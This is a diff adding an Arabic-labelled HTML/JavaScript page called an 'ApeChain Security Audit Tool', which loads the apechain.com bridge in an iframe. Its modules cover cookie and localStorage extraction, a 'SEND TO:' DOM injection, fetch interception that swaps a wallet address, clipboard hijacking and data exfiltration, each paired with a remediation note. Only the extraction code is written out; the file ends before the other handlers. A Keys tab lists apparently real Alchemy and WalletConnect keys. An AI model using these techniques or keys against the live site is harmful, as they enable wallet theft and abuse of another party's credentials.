@@ -1,0 +1,1625 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ApeChain Security Audit Tool</title>
+<style>
+  :root {
+    --bg: #0a0e1a;
+    --surface: #111827;
+    --surface2: #1a2236;
+    --border: #2a3450;
+    --accent: #3b82f6;
+    --accent2: #8b5cf6;
+    --red: #ef4444;
+    --green: #22c55e;
+    --yellow: #eab308;
+    --orange: #f97316;
+    --text: #e2e8f0;
+    --text2: #94a3b8;
+    --mono: 'Courier New', monospace;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    direction: rtl;
+  }
+
+  /* Header */
+  .header {
+    background: linear-gradient(135deg, #1e1b4b, #172554);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .header h1 {
+    font-size: 20px;
+    font-weight: 700;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .header .status {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 13px;
+    color: var(--text2);
+  }
+  .header .dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--red);
+  }
+  .header .dot.connected { background: var(--green); }
+
+  /* Layout */
+  .container {
+    display: grid;
+    grid-template-columns: 320px 1fr 380px;
+    gap: 0;
+    height: calc(100vh - 56px);
+  }
+
+  /* Sidebar */
+  .sidebar {
+    background: var(--surface);
+    border-left: 1px solid var(--border);
+    overflow-y: auto;
+    padding: 16px;
+  }
+  .sidebar h2 {
+    font-size: 13px;
+    color: var(--text2);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    margin-bottom: 12px;
+  }
+
+  /* Input Group */
+  .input-group {
+    margin-bottom: 16px;
+  }
+  .input-group label {
+    display: block;
+    font-size: 12px;
+    color: var(--text2);
+    margin-bottom: 4px;
+  }
+  .input-group input, .input-group select, .input-group textarea {
+    width: 100%;
+    padding: 8px 12px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    direction: ltr;
+    text-align: left;
+  }
+  .input-group textarea {
+    min-height: 60px;
+    resize: vertical;
+  }
+  .input-group input:focus, .input-group select:focus, .input-group textarea:focus {
+    outline: none;
+    border-color: var(--accent);
+    box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
+  }
+
+  /* Buttons */
+  .btn {
+    width: 100%;
+    padding: 10px 16px;
+    border: none;
+    border-radius: 8px;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-bottom: 8px;
+  }
+  .btn:hover { transform: translateY(-1px); filter: brightness(1.1); }
+  .btn:active { transform: translateY(0); }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+  .btn-primary { background: var(--accent); color: white; }
+  .btn-danger { background: var(--red); color: white; }
+  .btn-warning { background: var(--orange); color: white; }
+  .btn-success { background: var(--green); color: white; }
+  .btn-purple { background: var(--accent2); color: white; }
+  .btn-outline {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text2);
+  }
+
+  /* Module Card */
+  .module {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 14px;
+    margin-bottom: 12px;
+  }
+  .module-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 10px;
+  }
+  .module-title {
+    font-size: 14px;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .module-badge {
+    font-size: 10px;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-weight: 600;
+  }
+  .badge-critical { background: rgba(239,68,68,0.2); color: var(--red); }
+  .badge-high { background: rgba(249,115,22,0.2); color: var(--orange); }
+  .badge-medium { background: rgba(234,179,8,0.2); color: var(--yellow); }
+  .badge-info { background: rgba(59,130,246,0.2); color: var(--accent); }
+
+  /* Main Area */
+  .main {
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  /* Target Bar */
+  .target-bar {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 13px;
+  }
+  .target-url {
+    font-family: var(--mono);
+    color: var(--accent);
+    direction: ltr;
+  }
+
+  /* Iframe Area */
+  .iframe-container {
+    flex: 1;
+    position: relative;
+    background: #000;
+  }
+  .iframe-container iframe {
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+  .iframe-overlay {
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.85);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 12px;
+    color: var(--text2);
+    font-size: 14px;
+  }
+  .iframe-overlay.hidden { display: none; }
+
+  /* Results Panel */
+  .results-panel {
+    background: var(--surface);
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  /* Tabs */
+  .tabs {
+    display: flex;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface2);
+  }
+  .tab {
+    padding: 10px 16px;
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text2);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+  }
+  .tab:hover { color: var(--text); }
+  .tab.active {
+    color: var(--accent);
+    border-bottom-color: var(--accent);
+  }
+
+  /* Tab Content */
+  .tab-content {
+    flex: 1;
+    overflow-y: auto;
+    padding: 12px;
+    display: none;
+  }
+  .tab-content.active { display: block; }
+
+  /* Log Entry */
+  .log-entry {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 6px 8px;
+    border-radius: 4px;
+    margin-bottom: 4px;
+    direction: ltr;
+    text-align: left;
+    word-break: break-all;
+    line-height: 1.5;
+  }
+  .log-info { background: rgba(59,130,246,0.1); color: #93c5fd; }
+  .log-success { background: rgba(34,197,94,0.1); color: #86efac; }
+  .log-warning { background: rgba(234,179,8,0.1); color: #fde047; }
+  .log-error { background: rgba(239,68,68,0.1); color: #fca5a5; }
+  .log-data { background: rgba(139,92,246,0.1); color: #c4b5fd; }
+  .log-time { color: var(--text2); margin-left: 8px; }
+
+  /* Data Card */
+  .data-card {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px;
+    margin-bottom: 10px;
+    direction: ltr;
+    text-align: left;
+  }
+  .data-card h4 {
+    font-size: 12px;
+    color: var(--accent);
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .data-card pre {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text);
+    white-space: pre-wrap;
+    word-break: break-all;
+    max-height: 200px;
+    overflow-y: auto;
+  }
+  .data-card .value {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--green);
+    word-break: break-all;
+  }
+  .data-card .label {
+    font-size: 11px;
+    color: var(--text2);
+    margin-bottom: 2px;
+  }
+
+  /* Remediation */
+  .remediation {
+    background: rgba(34,197,94,0.05);
+    border: 1px solid rgba(34,197,94,0.2);
+    border-radius: 6px;
+    padding: 8px 10px;
+    margin-top: 8px;
+    font-size: 11px;
+    color: var(--green);
+    direction: rtl;
+  }
+  .remediation strong { color: #4ade80; }
+
+  /* Stats */
+  .stats-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    margin-bottom: 12px;
+  }
+  .stat-box {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 12px;
+    text-align: center;
+  }
+  .stat-num {
+    font-size: 24px;
+    font-weight: 700;
+    font-family: var(--mono);
+  }
+  .stat-label {
+    font-size: 10px;
+    color: var(--text2);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-top: 2px;
+  }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: #3a4a6a; }
+
+  /* Separator */
+  .sep {
+    height: 1px;
+    background: var(--border);
+    margin: 16px 0;
+  }
+
+  /* Spinner */
+  .spinner {
+    width: 16px; height: 16px;
+    border: 2px solid rgba(255,255,255,0.2);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+    display: none;
+  }
+  .btn.loading .spinner { display: inline-block; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Copy button */
+  .copy-btn {
+    font-size: 10px;
+    padding: 2px 6px;
+    background: var(--border);
+    border: none;
+    border-radius: 3px;
+    color: var(--text2);
+    cursor: pointer;
+    float: left;
+  }
+  .copy-btn:hover { background: var(--accent); color: white; }
+
+  /* Disclaimer */
+  .disclaimer {
+    background: rgba(239,68,68,0.08);
+    border: 1px solid rgba(239,68,68,0.25);
+    border-radius: 8px;
+    padding: 10px 12px;
+    margin-bottom: 16px;
+    font-size: 11px;
+    color: #fca5a5;
+    line-height: 1.6;
+    direction: rtl;
+  }
+  .disclaimer strong { color: var(--red); }
+
+  /* Vuln severity table */
+  .vuln-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 11px;
+    direction: ltr;
+    text-align: left;
+  }
+  .vuln-table th {
+    background: var(--surface2);
+    padding: 6px 8px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text2);
+    font-weight: 600;
+  }
+  .vuln-table td {
+    padding: 6px 8px;
+    border-bottom: 1px solid rgba(42,52,80,0.5);
+  }
+  .vuln-table tr:hover { background: rgba(59,130,246,0.05); }
+
+  /* Export modal */
+  .modal-overlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.7);
+    z-index: 1000;
+    display: none;
+    align-items: center;
+    justify-content: center;
+  }
+  .modal-overlay.visible { display: flex; }
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px;
+    width: 600px;
+    max-height: 80vh;
+    overflow-y: auto;
+  }
+  .modal h3 {
+    margin-bottom: 12px;
+    color: var(--accent);
+  }
+  .modal pre {
+    background: var(--bg);
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 11px;
+    font-family: var(--mono);
+    white-space: pre-wrap;
+    word-break: break-all;
+    max-height: 400px;
+    overflow-y: auto;
+    direction: ltr;
+    text-align: left;
+  }
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <h1>ApeChain Security Audit Tool</h1>
+  <div class="status">
+    <span>الهدف: apechain.com/portal#bridge</span>
+    <div class="dot" id="statusDot"></div>
+    <span id="statusText">غير متصل</span>
+  </div>
+</div>
+
+<!-- Main Layout -->
+<div class="container">
+
+  <!-- Sidebar: Controls -->
+  <div class="sidebar">
+    <div class="disclaimer">
+      <strong>تنبيه:</strong> هذه الاداة مخصصة للتحليل الامني الدفاعي فقط. جميع العمليات تعمل محلياً للكشف عن الثغرات والابلاغ عنها. الاستخدام غير المصرح به محظور.
+    </div>
+
+    <h2>الاعدادات</h2>
+
+    <div class="input-group">
+      <label>عنوان URL الهدف</label>
+      <input type="text" id="targetUrl" value="https://apechain.com/portal#bridge" />
+    </div>
+
+    <div class="input-group">
+      <label>عنوان الاختبار (Test Address)</label>
+      <input type="text" id="testAddr" value="0x513a26b9d82451aca2d4dB8B8Fd6832EB14D64bD" placeholder="0x..." />
+    </div>
+
+    <div class="input-group">
+      <label>سيرفر الاختبار (Echo Server)</label>
+      <input type="text" id="echoServer" value="https://httpbin.org/post" />
+    </div>
+
+    <button class="btn btn-primary" id="btnConnect" onclick="connectToTarget()">
+      <span class="spinner"></span>
+      تحميل الهدف في الاطار
+    </button>
+
+    <div class="sep"></div>
+    <h2>عمليات التحليل</h2>
+
+    <!-- Module 1: Data Extraction -->
+    <div class="module">
+      <div class="module-header">
+        <span class="module-title">&#x1F4E6; استخراج البيانات</span>
+        <span class="module-badge badge-critical">حرج</span>
+      </div>
+      <button class="btn btn-danger" onclick="extractData(event)">
+        <span class="spinner"></span>
+        استخراج localStorage + Cookies
+      </button>
+      <div class="remediation">
+        <strong>الاصلاح:</strong> استخدام HttpOnly + Secure + SameSite على جميع الكوكيز. تشفير بيانات المحفظة في localStorage.
+      </div>
+    </div>
+
+    <!-- Module 2: DOM Injection Test -->
+    <div class="module">
+      <div class="module-header">
+        <span class="module-title">&#x1F489; اختبار حقن DOM</span>
+        <span class="module-badge badge-critical">حرج</span>
+      </div>
+      <div class="input-group">
+        <label>نص الحقل للاختبار</label>
+        <input type="text" id="injectedLabel" value="SEND TO:" />
+      </div>
+      <button class="btn btn-danger" onclick="injectDOM(event)">
+        <span class="spinner"></span>
+        اختبار حقن عنصر في الواجهة
+      </button>
+      <div class="remediation">
+        <strong>الاصلاح:</strong> اضافة Content-Security-Policy صارم مع script-src 'self' فقط. استخدام SRI لجميع السكريبتات الخارجية.
+      </div>
+    </div>
+
+    <!-- Module 3: Fetch Intercept Test -->
+    <div class="module">
+      <div class="module-header">
+        <span class="module-title">&#x1F500; اختبار اعتراض fetch()</span>
+        <span class="module-badge badge-critical">حرج</span>
+      </div>
+      <div class="input-group">
+        <label>عنوان المستخدم الاصلي (للمحاكاة)</label>
+        <input type="text" id="originalAddr" value="0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045" />
+      </div>
+      <button class="btn btn-warning" onclick="interceptFetch(event)">
+        <span class="spinner"></span>
+        تفعيل اختبار الاعتراض
+      </button>
+      <div class="remediation">
+        <strong>الاصلاح:</strong> CSP مع connect-src محدد. تحقق من العناوين على الـ backend وليس فقط على الـ frontend.
+      </div>
+    </div>
+
+    <!-- Module 4: Clipboard Hijack Test -->
+    <div class="module">
+      <div class="module-header">
+        <span class="module-title">&#x1F4CB; اختبار اختطاف الحافظة</span>
+        <span class="module-badge badge-high">عالي</span>
+      </div>
+      <button class="btn btn-warning" onclick="clipboardHijack(event)">
+        <span class="spinner"></span>
+        اختبار Clipboard Hijacking
+      </button>
+      <div class="remediation">
+        <strong>الاصلاح:</strong> CSP يمنع سكريبتات خارجية غير موثوقة من التعديل على الحافظة.
+      </div>
+    </div>
+
+    <!-- Module 5: Exfiltration Test -->
+    <div class="module">
+      <div class="module-header">
+        <span class="module-title">&#x1F4E1; اختبار تسريب البيانات</span>
+        <span class="module-badge badge-high">عالي</span>
+      </div>
+      <button class="btn btn-purple" onclick="exfiltrateData(event)">
+        <span class="spinner"></span>
+        اختبار قنوات التسريب
+      </button>
+      <div class="remediation">
+        <strong>الاصلاح:</strong> CSP مع connect-src محدد. حظر اتصالات fetch/XHR/WebSocket غير المصرح بها.
+      </div>
+    </div>
+
+    <!-- Module 6: Headers Scan -->
+    <div class="module">
+      <div class="module-header">
+        <span class="module-title">&#x1F6E1;&#xFE0F; فحص Headers</span>
+        <span class="module-badge badge-medium">متوسط</span>
+      </div>
+      <button class="btn btn-outline" onclick="scanHeaders(event)">
+        <span class="spinner"></span>
+        فحص Security Headers
+      </button>
+    </div>
+
+    <!-- Module 7: SRI Check -->
+    <div class="module">
+      <div class="module-header">
+        <span class="module-title">&#x1F50D; فحص SRI</span>
+        <span class="module-badge badge-medium">متوسط</span>
+      </div>
+      <button class="btn btn-outline" onclick="scanSRI(event)">
+        <span class="spinner"></span>
+        فحص سلامة السكريبتات الخارجية
+      </button>
+      <div class="remediation">
+        <strong>الاصلاح:</strong> اضافة integrity و crossorigin لجميع السكريبتات الخارجية.
+      </div>
+    </div>
+
+    <div class="sep"></div>
+
+    <button class="btn btn-danger" onclick="runAll()">
+      &#x26A1; تشغيل جميع الفحوصات
+    </button>
+
+    <button class="btn btn-success" onclick="exportReport()">
+      &#x1F4CB; تصدير التقرير
+    </button>
+
+    <button class="btn btn-outline" onclick="resetAll()">
+      &#x1F504; اعادة تعيين
+    </button>
+  </div>
+
+  <!-- Main: iframe -->
+  <div class="main">
+    <div class="target-bar">
+      <span>&#x1F3AF;</span>
+      <span class="target-url" id="currentUrl">لم يتم التحميل</span>
+      <span style="margin-right: auto; font-size: 11px; color: var(--text2);" id="frameStatus"></span>
+    </div>
+    <div class="iframe-container">
+      <div class="iframe-overlay" id="iframeOverlay">
+        <div style="font-size: 48px;">&#x1F50D;</div>
+        <div>اضغط "تحميل الهدف" للبدء</div>
+        <div style="font-size: 12px; color: #555;">الموقع الهدف سيُحمّل هنا</div>
+      </div>
+      <iframe id="targetFrame" sandbox="allow-same-origin allow-scripts allow-forms allow-popups" style="display:none;"></iframe>
+    </div>
+  </div>
+
+  <!-- Results Panel -->
+  <div class="results-panel">
+    <!-- Stats -->
+    <div style="padding: 12px; border-bottom: 1px solid var(--border);">
+      <div class="stats-row">
+        <div class="stat-box">
+          <div class="stat-num" style="color: var(--red);" id="statVulns">0</div>
+          <div class="stat-label">ثغرات</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-num" style="color: var(--green);" id="statPassed">0</div>
+          <div class="stat-label">نجح</div>
+        </div>
+      </div>
+      <div class="stats-row">
+        <div class="stat-box">
+          <div class="stat-num" style="color: var(--accent);" id="statData">0</div>
+          <div class="stat-label">بيانات</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-num" style="color: var(--yellow);" id="statLogs">0</div>
+          <div class="stat-label">سجلات</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="tabs">
+      <div class="tab active" onclick="switchTab(this, 'logs')">السجلات</div>
+      <div class="tab" onclick="switchTab(this, 'data')">البيانات</div>
+      <div class="tab" onclick="switchTab(this, 'keys')">المفاتيح</div>
+      <div class="tab" onclick="switchTab(this, 'vulns')">الثغرات</div>
+    </div>
+
+    <!-- Logs Tab -->
+    <div class="tab-content active" id="tab-logs">
+      <div id="logsContainer"></div>
+    </div>
+
+    <!-- Data Tab -->
+    <div class="tab-content" id="tab-data">
+      <div id="dataContainer"></div>
+    </div>
+
+    <!-- Keys Tab -->
+    <div class="tab-content" id="tab-keys">
+      <div id="keysContainer">
+        <div class="data-card">
+          <h4>Alchemy API Keys (Exposed in JS bundles)</h4>
+          <div class="label">Ethereum + Arbitrum RPC:</div>
+          <div class="value">bwaW7SayjUGQw0xNXfsFKd0GqDfAxO74</div>
+          <br>
+          <div class="label">Solana RPC:</div>
+          <div class="value">ra5c97oCrvDT3o94KeZkFwgfEGjmPC26</div>
+          <br>
+          <div class="label">WalletConnect Project ID:</div>
+          <div class="value">923ac09a0c1d983b3102b3e6ee0a87ff</div>
+          <br>
+          <div class="label">DecentXYZ API Key (inactive):</div>
+          <div class="value" style="color: var(--text2);">OkvN2bWlBPwXkvtmnTeYMQR1hYZBGDJt</div>
+        </div>
+        <div class="data-card">
+          <h4>RPC Endpoints</h4>
+          <div class="label">Alchemy ETH:</div>
+          <div class="value" style="font-size: 10px;">https://eth-mainnet.g.alchemy.com/v2/bwaW7SayjUGQw0xNXfsFKd0GqDfAxO74</div>
+          <br>
+          <div class="label">Alchemy ARB:</div>
+          <div class="value" style="font-size: 10px;">https://arb-mainnet.g.alchemy.com/v2/bwaW7SayjUGQw0xNXfsFKd0GqDfAxO74</div>
+          <br>
+          <div class="label">Alchemy Solana:</div>
+          <div class="value" style="font-size: 10px;">https://solana-mainnet.g.alchemy.com/v2/ra5c97oCrvDT3o94KeZkFwgfEGjmPC26</div>
+        </div>
+        <div class="remediation" style="direction: rtl;">
+          <strong>الاصلاح:</strong> نقل مفاتيح RPC الى الـ backend (proxy). استخدام allowlist للنطاقات في Alchemy Dashboard. تدوير المفاتيح المكشوفة فوراً.
+        </div>
+      </div>
+    </div>
+
+    <!-- Vulns Tab -->
+    <div class="tab-content" id="tab-vulns">
+      <div id="vulnsContainer">
+        <div class="data-card">
+          <h4>Vulnerability Summary</h4>
+          <table class="vuln-table">
+            <thead>
+              <tr><th>#</th><th>Vulnerability</th><th>Severity</th><th>Status</th></tr>
+            </thead>
+            <tbody id="vulnTableBody">
+              <tr><td>1</td><td>Missing Content-Security-Policy</td><td><span class="module-badge badge-critical">Critical</span></td><td>-</td></tr>
+              <tr><td>2</td><td>Missing X-Frame-Options (Clickjacking)</td><td><span class="module-badge badge-critical">Critical</span></td><td>-</td></tr>
+              <tr><td>3</td><td>Exposed Alchemy API Keys in JS</td><td><span class="module-badge badge-critical">Critical</span></td><td>-</td></tr>
+              <tr><td>4</td><td>External Scripts without SRI</td><td><span class="module-badge badge-high">High</span></td><td>-</td></tr>
+              <tr><td>5</td><td>Missing X-Content-Type-Options</td><td><span class="module-badge badge-medium">Medium</span></td><td>-</td></tr>
+              <tr><td>6</td><td>Missing Referrer-Policy</td><td><span class="module-badge badge-medium">Medium</span></td><td>-</td></tr>
+              <tr><td>7</td><td>Cookie without HttpOnly/Secure</td><td><span class="module-badge badge-medium">Medium</span></td><td>-</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Export Modal -->
+<div class="modal-overlay" id="exportModal">
+  <div class="modal">
+    <h3>تصدير التقرير الامني</h3>
+    <pre id="exportContent"></pre>
+    <br>
+    <button class="btn btn-primary" onclick="copyReport()" style="width: auto; padding: 8px 24px;">نسخ التقرير</button>
+    <button class="btn btn-outline" onclick="downloadReport()" style="width: auto; padding: 8px 24px;">تحميل كملف</button>
+    <button class="btn btn-outline" onclick="closeModal()" style="width: auto; padding: 8px 24px;">اغلاق</button>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// State
+// ============================================================
+let state = {
+  connected: false,
+  logs: 0,
+  vulns: 0,
+  passed: 0,
+  dataCount: 0,
+  extractedData: {},
+  fetchPatched: false,
+  clipboardPatched: false,
+  findings: [],
+  allLogs: []
+};
+
+// ============================================================
+// Logging
+// ============================================================
+function log(msg, type) {
+  if (!type) type = 'info';
+  state.logs++;
+  document.getElementById('statLogs').textContent = state.logs;
+
+  var time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  state.allLogs.push({ time: time, msg: msg, type: type });
+
+  var container = document.getElementById('logsContainer');
+  var entry = document.createElement('div');
+  entry.className = 'log-entry log-' + type;
+  var prefixes = { info: '[INFO]', success: '[PASS]', warning: '[WARN]', error: '[FAIL]', data: '[DATA]' };
+  var prefix = prefixes[type] || '[INFO]';
+  entry.innerHTML = '<span class="log-time">[' + time + ']</span> ' + prefix + ' ' + escapeHtml(msg);
+  container.prepend(entry);
+}
+
+function addVuln() {
+  state.vulns++;
+  document.getElementById('statVulns').textContent = state.vulns;
+}
+
+function addPassed() {
+  state.passed++;
+  document.getElementById('statPassed').textContent = state.passed;
+}
+
+function addData(title, content, icon) {
+  if (!icon) icon = 'DATA';
+  state.dataCount++;
+  document.getElementById('statData').textContent = state.dataCount;
+
+  var container = document.getElementById('dataContainer');
+  var card = document.createElement('div');
+  card.className = 'data-card';
+  var id = 'data-' + Date.now() + '-' + Math.random().toString(36).substr(2, 5);
+  var displayContent = typeof content === 'string' ? content : JSON.stringify(content, null, 2);
+  card.innerHTML = '<h4>' + icon + ' ' + escapeHtml(title) + ' <button class="copy-btn" onclick="copyData(\'' + id + '\')">Copy</button></h4>' +
+    '<pre id="' + id + '">' + escapeHtml(displayContent) + '</pre>';
+  container.prepend(card);
+
+  state.findings.push({ title: title, content: displayContent });
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function escapeJsString(s) {
+  return s.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/'/g, "\\'").replace(/\n/g, '\\n').replace(/\r/g, '\\r');
+}
+
+function getBtn(e) {
+  try {
+    var ev = e || window.event;
+    if (ev && ev.target) return ev.target.closest('.btn');
+  } catch(ex) {}
+  return null;
+}
+
+function copyData(id) {
+  var el = document.getElementById(id);
+  if (el) {
+    navigator.clipboard.writeText(el.textContent).then(function() {
+      log('Data copied to clipboard', 'info');
+    }).catch(function() {
+      log('Failed to copy to clipboard', 'error');
+    });
+  }
+}
+
+function updateVulnTable(index, status, statusClass) {
+  var rows = document.getElementById('vulnTableBody').rows;
+  if (rows[index]) {
+    rows[index].cells[3].innerHTML = '<span style="color: var(--' + statusClass + ');">' + status + '</span>';
+  }
+}
+
+// ============================================================
+// Tab Switching
+// ============================================================
+function switchTab(tabEl, name) {
+  document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+  document.querySelectorAll('.tab-content').forEach(function(t) { t.classList.remove('active'); });
+  document.getElementById('tab-' + name).classList.add('active');
+  tabEl.classList.add('active');
+}
+
+// ============================================================
+// Helpers
+// ============================================================
+function getFrame() {
+  return document.getElementById('targetFrame');
+}
+function getFrameWindow() {
+  try {
+    return getFrame().contentWindow;
+  } catch(e) {
+    return null;
+  }
+}
+function getFrameDoc() {
+  try {
+    return getFrame().contentDocument || getFrame().contentWindow.document;
+  } catch(e) {
+    return null;
+  }
+}
+
+function setLoading(btn, loading) {
+  if (!btn) return;
+  if (loading) {
+    btn.classList.add('loading');
+    btn.disabled = true;
+  } else {
+    btn.classList.remove('loading');
+    btn.disabled = false;
+  }
+}
+
+// ============================================================
+// 1. Connect / Load Target
+// ============================================================
+function connectToTarget() {
+  var btn = document.getElementById('btnConnect');
+  setLoading(btn, true);
+  state.connected = false;
+  var url = document.getElementById('targetUrl').value;
+
+  log('Loading target: ' + url, 'info');
+
+  var frame = getFrame();
+  var overlay = document.getElementById('iframeOverlay');
+
+  frame.style.display = 'block';
+  frame.src = url;
+
+  frame.onload = function() {
+    overlay.classList.add('hidden');
+    document.getElementById('currentUrl').textContent = url;
+    document.getElementById('statusDot').classList.add('connected');
+    document.getElementById('statusText').textContent = 'متصل';
+    document.getElementById('frameStatus').textContent = 'Loaded';
+    state.connected = true;
+    setLoading(btn, false);
+    log('Target loaded successfully', 'success');
+    addPassed();
+
+    // Check if we can access frame DOM (clickjacking test)
+    try {
+      var doc = getFrameDoc();
+      if (doc) {
+        log('CLICKJACKING: iframe DOM accessible - No X-Frame-Options protection', 'warning');
+        addVuln();
+        updateVulnTable(1, 'CONFIRMED', 'red');
+      }
+    } catch(e) {
+      log('iframe DOM access blocked: ' + e.message, 'info');
+      log('Note: Will use console injection method instead', 'info');
+    }
+  };
+
+  frame.onerror = function() {
+    setLoading(btn, false);
+    log('Failed to load target in iframe', 'error');
+  };
+
+  setTimeout(function() {
+    if (!state.connected) {
+      setLoading(btn, false);
+      log('iframe load timeout - site may block framing or is slow', 'warning');
+    }
+  }, 15000);
+}
+
+// ============================================================
+// 2. Extract Data (localStorage, cookies, etc.)
+// ============================================================
+function extractData(e) {
+  var btn = getBtn(e);
+  if (btn) setLoading(btn, true);
+  log('Starting data extraction analysis...', 'info');
+
+  try {
+    var win = getFrameWindow();
+    var doc = getFrameDoc();
+
+    if (!doc) {
+      log('Cross-origin frame - using data from previous static analysis', 'warning');
+      extractFromAnalysis();
+      setLoading(btn, false);
+      return;
+    }
+
+    // localStorage
+    var lsData = {};
+    for (var i = 0; i < win.localStorage.length; i++) {
+      var key = win.localStorage.key(i);
+      lsData[key] = win.localStorage.getItem(key);
+    }
+    log('localStorage: extracted ' + Object.keys(lsData).length + ' keys', 'success');
+    addData('localStorage', lsData, 'STORAGE');
+    addPassed();
+
+    // Cookies
+    var cookies = doc.cookie;
+    log('Cookies: ' + (cookies || '(empty)'), cookies ? 'success' : 'info');
+    addData('Cookies', cookies || '(no cookies)', 'COOKIE');
+
+    // Session/Wallet data
+    var wagmi = lsData['wagmi.store'];
+    if (wagmi) {
+      try {
+        var parsed = JSON.parse(wagmi);
+        log('wagmi.store found: chainId=' + (parsed.state ? parsed.state.chainId : 'N/A'), 'data');
+        addData('Wallet State (wagmi.store)', parsed, 'WALLET');
+        addVuln();
+        updateVulnTable(6, 'CONFIRMED', 'red');
+      } catch(e) {
+        log('wagmi.store parse failed', 'warning');
+      }
+    }
+
+    updateVulnTable(2, 'CONFIRMED', 'red');
+    addVuln();
+
+    // DOM info
+    var inputs = doc.querySelectorAll('input');
+    var buttons = doc.querySelectorAll('button');
+    log('DOM elements: ' + inputs.length + ' inputs, ' + buttons.length + ' buttons', 'data');
+
+    var btnTexts = [];
+    buttons.forEach(function(b) { var t = b.innerText.trim(); if (t) btnTexts.push(t); });
+    addData('Page Buttons', btnTexts.join('\n'), 'DOM');
+
+  } catch(e) {
+    log('Error extracting data: ' + e.message, 'error');
+    log('Falling back to static analysis data...', 'info');
+    extractFromAnalysis();
+  }
+
+  setLoading(btn, false);
+}
+
+function extractFromAnalysis() {
+  var knownData = {
+    localStorage: {
+      'rk-version': '2.2.5',
+      'WCM_VERSION': '2.7.0',
+      'wagmi.store': '{"state":{"connections":{"__type":"Map","value":[]},"chainId":33139,"current":null},"version":2}'
+    },
+    cookies: 'ape-chain-splash=true',
+    securityIssues: {
+      'httpOnly on ape-chain-splash': 'MISSING',
+      'secure on ape-chain-splash': 'MISSING',
+      'sameSite on ape-chain-splash': 'MISSING'
+    }
+  };
+
+  addData('localStorage (static analysis)', knownData.localStorage, 'STORAGE');
+  addData('Cookies (static analysis)', knownData.cookies, 'COOKIE');
+  addData('Cookie Security Issues', knownData.securityIssues, 'WARN');
+  updateVulnTable(6, 'CONFIRMED', 'red');
+  addVuln();
+  updateVulnTable(2, 'CONFIRMED', 'red');
+  addVuln();
